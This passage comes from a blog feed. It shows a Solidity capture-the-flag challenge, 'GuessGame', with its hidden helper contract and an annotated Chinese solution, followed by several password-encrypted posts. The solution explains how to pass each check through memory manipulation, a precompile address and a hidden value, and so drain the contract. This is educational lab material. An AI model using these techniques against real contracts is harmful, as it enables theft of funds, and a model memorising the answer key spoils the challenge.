class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">// 将这个代码给玩家</span><br><span class="line">pragma solidity 0.8.21;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract A&#123;</span><br><span class="line">    function number() pure external returns(uint256)&#123;</span><br><span class="line">        return 10;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MyToken is ERC20 &#123;</span><br><span class="line">    constructor() ERC20(&quot;MyToken&quot;, &quot;MTK&quot;) &#123;</span><br><span class="line">        _mint(msg.sender,100);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GuessGame &#123;</span><br><span class="line">    uint256 private immutable random01;</span><br><span class="line">    uint256 private immutable random02;</span><br><span class="line">    uint256 private immutable random03;</span><br><span class="line">    A private  immutable random04;</span><br><span class="line">    MyToken private immutable mytoken;</span><br><span class="line"></span><br><span class="line">    constructor(A _a) public &#123;</span><br><span class="line">        mytoken = new MyToken();</span><br><span class="line"></span><br><span class="line">        random01 = uint160(msg.sender);</span><br><span class="line">        random02 = uint256(keccak256(address(new A()).code));</span><br><span class="line">        random03 = block.timestamp;</span><br><span class="line">        random04 = _a; </span><br><span class="line">        pureFunc();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pureFunc() pure internal &#123;</span><br><span class="line">        assembly&#123;</span><br><span class="line">            mstore(0x80,1)</span><br><span class="line">            mstore(0xa0,2)</span><br><span class="line">            mstore(0xc0,32)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint256 _random01, uint256 _random02, uint256 _random03, uint256 _random04) external payable returns(bool)&#123;</span><br><span class="line">    </span><br><span class="line">        if(msg.value &gt; 100 ether)&#123;</span><br><span class="line">            // 100 eth! you are VIP!</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            uint256[] memory arr;</span><br><span class="line">            uint256 money = msg.value;</span><br><span class="line">            assembly&#123;</span><br><span class="line">                mstore(_random01, money)</span><br><span class="line">            &#125;</span><br><span class="line">            require(random01 == arr.length,&quot;wrong number01&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint256 y = ( uint160(address(msg.sender)) + random01 + random02 + random03 + _random02) &amp; 0xff;</span><br><span class="line">        require(random02 == y,&quot;wrong number02&quot;);</span><br><span class="line"></span><br><span class="line">        require(uint160(_random03) &lt; uint160(0x0000000000fFff8545DcFcb03fCB875F56bedDc4));</span><br><span class="line">        (,bytes memory data) = address(uint160(_random03)).staticcall(&quot;Fallbacker()&quot;);</span><br><span class="line">        require(random03 == data.length,&quot;wrong number03&quot;);</span><br><span class="line"></span><br><span class="line">        require(random04.number() == _random04, &quot;wrong number04&quot;);</span><br><span class="line"></span><br><span class="line">        mytoken.transfer(msg.sender,100);</span><br><span class="line">        payable(msg.sender).transfer(address(this).balance);</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function captureTheFalg() external view returns(bool)&#123;</span><br><span class="line">        return mytoken.balanceOf(address(this)) == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 这个合约代码不要给玩家！！！</span><br><span class="line">pragma solidity 0.8.21;</span><br><span class="line"></span><br><span class="line">contract B&#123;</span><br><span class="line">    uint256 public number = 11;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>假设我们用0x5B38Da6a701c568545dCfcB03FcB875f56beddC4用户进行解题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.21;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract A&#123;</span><br><span class="line">    function number() pure external returns(uint256)&#123;</span><br><span class="line">        return 10;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MyToken is ERC20 &#123;</span><br><span class="line">    constructor() ERC20(&quot;MyToken&quot;, &quot;MTK&quot;) &#123;</span><br><span class="line">        _mint(msg.sender,100);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GuessGame &#123;</span><br><span class="line">    uint256 private immutable random01;</span><br><span class="line">    uint256 private immutable random02;</span><br><span class="line">    uint256 private immutable random03;</span><br><span class="line">    A private  immutable random04;</span><br><span class="line">    MyToken private immutable mytoken;</span><br><span class="line"></span><br><span class="line">    constructor(A _a) public &#123;</span><br><span class="line">        mytoken = new MyToken();</span><br><span class="line"></span><br><span class="line">        random01 = uint160(msg.sender);</span><br><span class="line">        random02 = uint256(keccak256(address(new A()).code));</span><br><span class="line">        random03 = block.timestamp;</span><br><span class="line">        random04 = _a; // 不要输入A的合约的地址，输入B合约的地址</span><br><span class="line">        pureFunc();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pureFunc() pure internal &#123;</span><br><span class="line">        assembly&#123;</span><br><span class="line">        // 1，2，32才是实际的random01、random02、random03的值</span><br><span class="line">            mstore(0x80,1)</span><br><span class="line">            mstore(0xa0,2)</span><br><span class="line">            mstore(0xc0,32)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint256 _random01, uint256 _random02, uint256 _random03, uint256 _random04) external payable returns(bool)&#123;</span><br><span class="line">        if(msg.value &gt; 100 ether)&#123;</span><br><span class="line">            // 100 eth! you are VIP!</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            // 零槽位</span><br><span class="line">            // _random01 = 0x60 = 96  &amp;&amp;  msg.value = 1 wei</span><br><span class="line">            uint256[] memory arr;</span><br><span class="line">            uint256 money = msg.value;</span><br><span class="line">            assembly&#123;</span><br><span class="line">                mstore(_random01, money)</span><br><span class="line">            &#125;</span><br><span class="line">            require(random01 == arr.length,&quot;wrong number01&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // CREATE2</span><br><span class="line">        // C4 + 1 + 2 + 32 + ? = 2</span><br><span class="line">        // msg.sender = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</span><br><span class="line">        // 231 + ? = 2    ==&gt;   0xE7(231) + ? = 0x02(2)  ==&gt; ?=27</span><br><span class="line">        // ==&gt; _random02=27</span><br><span class="line">        // 玩家需要自行计算自己的_random02，27是举个例子</span><br><span class="line">        uint256 y = ( uint160(address(msg.sender)) + random01 + random02 + random03 + _random02) &amp; 0xff;</span><br><span class="line">        require(random02 == y,&quot;wrong number02&quot;);</span><br><span class="line"></span><br><span class="line">        // 似乎想用CREATE2爆破？这难度非常高，爆破要非常久</span><br><span class="line">        // 不不不，这里的考点不是CREATE2而是precompile contract</span><br><span class="line">        // _random03 = 0x0000000000000000000000000000000000000002   sha2-256        input: any      output: bytes32</span><br><span class="line">        require(uint160(_random03) &lt; uint160(0x0000000000fFff8545DcFcb03fCB875F56bedDc4));</span><br><span class="line">        (,bytes memory data) = address(uint160(_random03)).staticcall(&quot;Fallbacker()&quot;);</span><br><span class="line">        require(random03 == data.length,&quot;wrong number03&quot;);</span><br><span class="line"></span><br><span class="line">        // random 并不是new 出来的。B合约不verify，反编译可以得到number()为11，或者直接获取number()</span><br><span class="line">        // _random04 = 11</span><br><span class="line">        require(random04.number() == _random04, &quot;wrong number04&quot;);</span><br><span class="line"></span><br><span class="line">        mytoken.transfer(msg.sender,100);</span><br><span class="line">        payable(msg.sender).transfer(address(this).balance);</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function captureTheFalg() external view returns(bool)&#123;</span><br><span class="line">        return mytoken.balanceOf(address(this)) == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 11才是真正的random04的值</span><br><span class="line">pragma solidity 0.8.21;</span><br><span class="line"></span><br><span class="line">contract B&#123;</span><br><span class="line">    uint256 public number = 11;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 22.MetaTrustCTF2023 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>00.digest</title>
      <link href="/2023/09/03/13.RugPull/00.digest/"/>
      <url>/2023/09/03/13.RugPull/00.digest/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="fe4b4a7592650642f65e0148439220939d513baa29b851a87cb0cd4a651a711a">5cd6d88a1d91bc4117b062d0086622af5896445cb0373ec30e23514ead5564133caab0580569d8fc488d74859eb8316c8628a61d1f9e99bb633e54588a0610c21c20d8d7766ca6781d9de5123fea87ce3756447acbb170390904ba969292d0a9adefbeaeb98d15dcf25ada19a7d4d8bb2f974df1725356fc4b52aa16b7faaa7c44647a845b4f50bbb60e8a4bb06f634fdfb11100c45d2e1c0fac62573c3a4a9ce446e26252970d7923902f68c3ac668cf54c0ea4acd02f000e8b6dd86de8ada7831592d13e2683e715e0d81a6ef747a7913d39f9e22c1df019e874e4da2e90c300f3dd2a6e027835d913e39c3e3853d4cfd858c08ea861d942f4883ac3b0c824c0b1d8d997ad191f14307f890995978b07f4fe5f61fc64f4eeafed57fd6e4d7fd75b8f8f6feeda37545eec5f7987294bd47950b67fe3904c74124a8dcbaad21a3fed7c9e8c2c96a74eb639c5ec423192cb6751db9c31878eb85d3f62e09cb5d0606d92eed642ad2686285b2a14a33d0708144f8749968f10348b6bc8cc4ce9d8caaf49d460aee833cd7b0e24d823dbfc261950084ec12b77c61ec1282e96b5b82e41b5222223e38b7bc412b517fe01b78e6f9e8fe024d5a94dbe31e63630d6cf2f184ad70836eecf701af9664c1120740f395d1acbefa0de762477572c959f153310217d17b00de9066fc142e50e369d357f45f3b4074651b5b5edb955075a69557f35dee4fcac3a614b531ae81c282c47db05a9ffe01a2338d535d111b5c8e1a632e02b80c217034d0c396fcb1233689050675809a318c5fe74648e550e74bb4b713f5c3f4fcea314486eb04beb64749b05ad26f108453742f7085c66ee8c34ff60dc1646ed9a3d7f86d5bd86369ac2ea9dcf0567e54a2daabf696f146dbd682254fc6a868167051d45b171f97777d7f510ababf207760542e9268483bc4d50af09cd502bf7dae5ac2a6ca3be056f490dd3639249fdd1891aa4baf2f72df0de6f0f64f748a28cd4f32ad9970aaeb77793a2a362ee30d1b967210f1da710c0650356d1c55bd9f9927ad4d0f82f1bb53999751a588e02a479724e2bb43a4c62b5ddc9537aae85c880aabef5ccc26bf359e58c0d0066e002724038bf87ba8c40cee80991ac4da0af5a0e092a8b06ce50ef837e14077a8ad9e00b0ec6a13056956ad3855fed1784fc8ddc2592b1686b61a14675f4a255519dd874878ec95cfb8efa59a004817d3f04799d2d945d7f0ee85fed00e16a9d8dff6862cd401b0f00e29dcc20350b61b128b957d3c72ad53d90941d0984f8ad38f8e017e47197863fa7690252aae961b1577ea0f32b0c929287c3</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 13.RugPull </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>00.digest</title>
      <link href="/2023/09/03/08.PoC/00.digest/"/>
      <url>/2023/09/03/08.PoC/00.digest/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="de4416683ac86a62212d40ccf343947e6507d02805189c2987f02f36daee6ede">5cd6d88a1d91bc4117b062d0086622af5896445cb0373ec30e23514ead5564133caab0580569d8fc488d74859eb8316c8628a61d1f9e99bb633e54588a0610c21c20d8d7766ca6781d9de5123fea87ce3756447acbb170390904ba969292d0a99934b4505200c2ca084cc01a360006fcfa54ba097f961119676de925d6294f0c198996b416b3716a5a1f23d93131d2bf9e25eaa5c03c558538a20fce38c2da9aa77c0bb25a65c1126b84b2a9ef71331cf6b0fb2df4700e30ff8a75efbef3f46776306fed9b3f1a790d9bd6e95f9dfadb43ea98d889d27a0a7d5cdd3ea73c5ef0c43f47f4d22bd90f6a0322e2404c2133fcbfb5a27a381d1bb24016a69619640a41442252b8659bc468a8aada5aa24bfd5a1a9e5097fa55f9f06aab4a1a0e0e8a85e62759045cd147c068f1556fb71b0e77a3f39b0bcc8d1c338fe0b82985fb926b40fcca897bd35eb23b875ff03112291a5491930efdf33d4d688b00e65441160742b6342b7fe5811224d088d31b1c4626e17c3281622ce1a2c40c131eee92d61a9fea10751309d6b0fcd521de29bddd1003598c73a1a313637673c3cc70e2eb539f8861f30fd7be549dd68e4ec3498373461aa6ecc4bc5f606a0e801e957a8a057df5e3aa10fffb22cb54feae8b4225f9f92124819016e13932583e17d83f957478585334317b8c326f264eee4af988901f8b15608f55331c325960cb8b0242c7c4f71eccba403d2c19ee27e8f3b4064f4e198f863fee6539a7b572de8ea46c87539b241bd3b306bb6c7ecd630314d7023e819766e5270a3c7b1822804e4ccda51b42bfda5318812fca3101459ba20c55d7b9afd1d82eb0a8b3ffba22134ded639c95f94d97459c3f9b4653221a7c830d7d463209a0ee6241541494849e9de6111bbd2104a40f284a817a90bb180f7254871e08d9133136177f2dcaf6fd297e260d3feb62c89e4a6f230b5f2c234591d87fda2c8f8cf1b73b3db6cd28d4aaf43d7a70979b99f8391d2307a3107cf7587e1cd1d83605fd1b6a03051f50532394dab2e3cc94108783019ec16635cd2ba7861a955fa941be2a9a523c8596179e6cc1e3efb3f97cc8292c4513269394e1a95361f072f305cfa07e53b43a16b256b664e33db9360679b2f40b593bfc383d8b9461fb09e0f2ef99d955de9bc5c3e878f1eaa7b6faa40511d34e0a64e7b5bf3f226d060ddd30bf8c2cb9e205453490398bc76cb2322c7034eafdbb465fec2ed32ad912cce38172bbbc30333b41ad4ebe54d3bcdea925f7a935fd92eab649c8ce0bbd02eca11241534ffc5bd1f8429f9316872bb02baced431b9477346f11b0616579716974128450671320628cc747e40ca3489dd90621a02094293249539dd8f1deb868a42c57742359bf5a1225657e4cb57d1991bfc37af94f10345f6f32d1f34426918503ccf012596b1233017889ecb25ff996079a1b8f57681932a066b676db89e2547d432dd4edb42f0d7d61a0f17a412723781791a248df4f7c18cfc8eb75be54d1db0cfe325a8596f1060102671c1ab6d38754c06b728fa4a553ba63735e839c3a46c0e0dfd82ddfa6905f8373ee3d7eb1bc4c65d2d1b1ce3aac71ad6819524aeda26b99bb44c64adee44195998e713c59e18db09c49367f22d6b48a52a2ddeb0a9ea87f01e047f3e99df6231d5ff89f3ca7cedbbbb74f8a082a88efaa6d4cd4bc47cb08d0e661ecaa796973d5e71e04f2c08dce4930fffd3f8a3eadc476b8d8d70765e0a2a00a6d9adbb773b5e601f21db2d24bde025edc1e607c919191b254a7b24c482cf70fe56f8f180e39a40e8beb69cf26cfe3d4726e21fbefa13e2edbaac682534617ba04a8ba1f6b6d04fdf6cebe96a8255d0880b7241227f4d260a6a8bc6b2ad47e00b229e9186a412528cffbe396f66fad7a8c08333d90675d4661f70314b3c09c6f49a9721a26043a11c9c41b851fbc0b56b0218913f07c286dc26eb80c27d9557a54e74798053bb7fac005ebe8e2f2ce94a2d190ccd8f19cefabd1f5a4a3b895666f697c1223348598e45c8cca0f3713868659bc14be27220a27fadc5513c17d1c51a444ddd83f9caa0757e16a39471e0ff5d993f321a61a73b0649012023b3f7dcbee20fe5057651d3f1705ae1b9dec7c3aa9b7d2b38438b028836503306383917136350dc2ccbf6f780221c668868d9415fe731ff37761977671ea4429cd6aa3e636f7d23ceb08b11fcc9be5c26cb6fd063affbf9312be47c90c57024c4e26323d103404de0ef3b4b9e8da5b50335a19a335320c22471c120655ea2b2a6ee6f56600b2fe9f8db587c830ef240dadac7dea5b0ed776a1e991621777206c65cfd4c45b108fc1e4c654733e2465ca7c60b5e9f680cc2063b95f61605aa1bcceb37c52ad23fd3a3f88009ebdd7dd7f638afd5ee11bbab3d0a9d39fceb38a818783ea69e22f0703dc4d16b2b497bb1afb89996637bf6b7d4409cefad08ac648d8484b67d8a0c279a438e2164bb4e076939655356a4be5ee39ef065e83975ad0c9cc889a55f2e226ecc9f8bad1ce2518a7c084251430aa831ae928bee60d142ebbc2824b1db6a4ba7a44dc77f2fdcd62190133afce96b088c7f89fb98d9d4f0c85ad8462732535540d3b710ee9428963e7928a0be72e1735f6491a286678f1995b7afe526c01b78777bfa4964d8f96045e25a5da38be478644bb912ec3892bebf6933819360590b11a496d13883b627aa4d21d193ab6cd13514ce6c49888595a4daff625795576a0be72c947630e0d04dfc9f40e937efed6d3f2b1edf0fc227fb7ed07f3e5321f2564c9bfc8f6bc093e3fe51e149cd9a1195a6cd892244984f61cb1c98ea6e31e3ceb2174fa34fc737b8c46f4ab6c3a6725f6ad55f3bd17e7ea9c6a397547f1f335ebffb3b79f7c98633dc4f42319a4a9a481f7bf4e535f36ccd59df39c51c5eb2a4bc4762238f1ca5dd04b1e4833b4104b05fbe16cb4923adc0f677df5c8beca3a1136d6e1493bfacbfd735007cc7ff4f6533017930688c18553d22cdc00baa140eaf42cdd737f951a44a5517e0da8c20d6c1078d55147d3a277f4e2648eca573a0f10067502a66dbf16c491636be668540d6b6542acdd73e33912b1ba936c045edefa1ae87d84e003f83dde2c8e39add217b4321391f2a1f2e0ec9943cfeb36aec41ff2be84cc0a1b9fd2ff00c916ae9514874d98a6c88218df3a9e1b63668eb5b31bc08e60914aedd5880ee44f131e6cee47f65d34e14e85981206e35edfa5a1ddd05c89046def64124832b1b0504f511befea6b65b94a714d38bb035f0976916a1a5a596170612c9f9b182878ecf7341c281c8b79bd957085cf69a4a9ff906e1800d0489345a979810e979c6b229d4a5ce06d739918a8621faf4498d642094876e7ef4c590c9928e9006bfc36e96bc2a82f544709089f85a85f2ec7e11bb7b2cc0def5c7865e97b6ff56ae40e904c3874eb8f72305d0c22625ee6af70009f629ee0a32016c13fd784ac4909a0d7690bd973a70d19154629c9ef40ce7cb7ae7f057938bff26f4786734563e2f80e5d19d1873a5c5320c02300c27801fe1d8ab8420e8611d6d24b21a8b21a7b94d5b60984f9954c31bb7f18888f7461e64f27e7a9574350d5d09e27386ca899f48c2c92da9e3f211a4132e0822062f8e9150e6703f384231d5eab339ae7b7f574c0bc33d81e73ad72d8966948ac1c48393a999ac79c097e6cc3580949050bfda9c35fd24cc05db812c6c13028d3b802bbcc1aea6481eef3b4af1268a94238fc5be9ebad3f8e0bc1bfa49a0bc7cd6008762e26f432506bc44affb310ecb4b6179c304e6677d5e860af0416782040befcbc13707b708a211b16703a402acdc3d87efe191b7a6bfab32023bb20d9c67492d1a9a778cc4e9fc016e669001b267915ee557a8f7c48ab4fc1ff478a9bfac1176c314b57cdb54c24e8d131170860adc0d7cbda393fba44c93637f20ac5792b3c8c2a2663cea9f8a982902eda705bcfc3b29c7f042e1b4abee0b118f23e655568afd9ce7fc3f3e89bba406b4b9b2b1c60782963e0871110a8e946940202f912b992d2670d5dcdd7f8aa2b267d44f63b3242e123c6fd8a1f1285ae8d8b86b90d2377bf649ee38dad9d59ab8f2c6e0ca77b7d738d72fa673c22b891c0bd7ba643dfc0a6d6dcaf0837e3992c8e9ca3ffa1c761c76ff5dd71af3c1899aff0be42436dbf0bbf2190cc3cc5dc975f4500015a232d5d80d8523c91a35ee23259575a12b04720ba5dbc97d5e7bfbd410f0814a71d57555048eb2590b123d81fcd5c5f4759d3d249f3fd54ebce7aa559d47a6988bf1e6e0656086e91a2bf7e4f37c53aa2f6d862a52d601efdd7c8278de9b7296c3f6dd20b93822d49c4a04a3517104b756022e13f4a1fb3f2e53984ba4de9d6e408e32278381233644a9f385db45ab41792b5760847f1efaa8d66f25ad23684815f95f92486582c65032ef2e3906269eab472562ddb15df671c687a0071ddbd01b7c9f80281717495de4052a9cb774ea69116e89504258e7b8b15b3bbfaecf919e5430dc64641c553701b047a141f7c36c965ec708d1136e9cdf13a41d0a4ce70ef48e54d0f9f0a268ca00221a570135e3b5482ddad5e3d834b1bdba9da756e793edd8de857684fa65eb9edfbfbd479218f25b09c9b57538a50daf537bccecd058c1557672c6872f7293122fe8009761145e88e54eaa793041d42cd79f4e102d455239ca8367e081a3c0be4e414a6bd1420b78fa6266c387dbd47327b8115a2a538b79511a76575628c7004cc765d6bf574a892a99f402132f8bf50f39b5694613a891e84cb3f1191f0fde12c080d610d62aec4ae43bf510d1ba2584e8c4a41596e2cb2d1804cb6f136921647059eae1ccfa3f1d7516a517d03575b1125f5f641b3f6c9b3a00d5d3d6d16871b25cc27cf903b694c47c8bb3d58a9e8661513a89307ff1385b17de26602881542bbb670b91f284e14fd74f2320608868d1dd02fdf90ea254a905d0f0bc572157d88cb230faf9eaa5fd2fb13d188d18176cdbc54d60db8c69f67a03fcb4d6f5641b5cfc91996f3e2850ae25ae2dd49b9f3f5d87e6c111c3b08e562c284e476e9e293a657ec0dc9a5d46028949993136cb854fed9b156d0d18526d29b6615120ec5c72fc5025da3d42b4b6d585ef3d1a0ef2aba6ed5a0408c40946ccabbe36827693dfc8c264eefd2b9c37d29496b6f3545c2901ac599035dff37aad0a2914c07843cd131b73bf6ea52783a3be019191ea8cd9a69d41866fa7c067869a3cb5ee2e4a4e460b51834f34b052c17848ff597b0f42e6d131c0c2bc693611f3b3112da7cf2dad6f5ad383b5369f2dbc8cad056f39b7a418ea2948638c3261a039e3cc6fe46c1dd1770291f27facf8fe78313ae1a502ef938a5e05a69be2b788f0399ee0ee77ea4e8b2cc67be83f435244501b10513445e901047013a3972c666f26139b03c9ef03a97f9b411e1d4edbd795e498d2a06b193d641e8f9105a729ba978ffbd04e96ec1ed003304d6fdcf8c823cbb3727c09a42a806e5a6cb486d31e2386d020f6098c8539674844d63433125d8bd887d049374b91f00209bd8f0ace2d407e74861eb5330135e2f06dba5da7c77876daa3b4ec42839c12b09a9629b4fbcd58b0ea76c58d6343a4c4b5aa323f664d817d8de07f9a612acb54bb3824dfabfb28b6bcb3ce6f982144c860f63617b59ae0e7cd273d4da44665fb3d4ed29a4902629e6b3b6003784518070b14160f71655501d09193ac827ee8fb172c0ea06adca81358b9f361f60d616588897b48edde8e837234c18047a10146f87ebc8c29a74ff1f49b1bec6bf8d05f8ea9b5ad96b82d3105cb1eeae58449f6ef09912f9d60c7648c841892180ed93f0fd26bea4520092c4dba8cd52b8c3c7e02500ec7fc03d1af445e975bb931f807ae181f02416eb861e60ed895e4ccd297b4d90b2f73097b46d0ba4d088f8110911062299a0cefc91ecef01e9f385654ddaae2240594ef8af15168c267a04011a7f5614e5fca65731d23ebcdd3201fd8a98524142d5a92ce0636d852ea2c611b816243d8857f6886282a529a1c4498f6dfff4d6f6fe701f67d6c87ecf146657831f67edc82b5db42ebd1211e37d34ff3dd988afa79fa15d6d4b18e10efc57b94f3adbfa9ae1919f3fcfca4281a8a6519891f46bbfdd0b55caa1240c9f26ed72d6feb65243d42b36642cab42deeb41f6f55fe2edade79b0296acaac468bfcc88ba0505d8632667fc9167227b0a2f34a33e3e1b71044c7740e39bbe9a857edc1c566c7f1fbbdb9cec519278f7d5a47dc83cc85918779d32628ac2608f81bab1c011fdd6d417fdfd03426632ef3099732ca09c6a6e4ca1f6f72ca7f3da10eb0ac0b36c8080aef06e641dabc2c4e3f25419f18ad4d96bde2b0f5b2e608179937a494774a9f7cc148015e9fb3ec5c479add5098967dd3f4d401f05aa5b0278db33fc474096a4112553e2d4cfb63ceb63c50a8cc2d8308c63fbfa3e4f42eb3bd7a163c7c3b59b8f889af939d45b9495a98d49bf942be33d65d8c738b18c1299bc44e0170131eff4b5ec49d7f564aba61ea93b93673cfb2f44d802596256a96ada5e5f2623411b14aace7e8871a083f8db681524ac32349b72927807a3beab90453dfa1bcf5f00b87a894a824c305deeb89bc925a4</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 08.PoC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>01.hello</title>
      <link href="/2023/08/31/19.Paradigm%20CTF%202021/01.hello/"/>
      <url>/2023/08/31/19.Paradigm%20CTF%202021/01.hello/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="fea24d9914b6fbf0110b04971af3e5361782c4d53f1dfa01b48053057b2ee049">5cd6d88a1d91bc4117b062d0086622af5896445cb0373ec30e23514ead55641301b4f33b6ead1cc60fc7d90a76307051b052dfd90c495980031ea44c857b9708e05693608380543debe54fe725ad2a0ee5cd0b681b4bd46b96576efd1a4e23c6fd6c740e934869721f529f16abd8221dfb3965e8cde97bc12e5f9a195b606506</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" 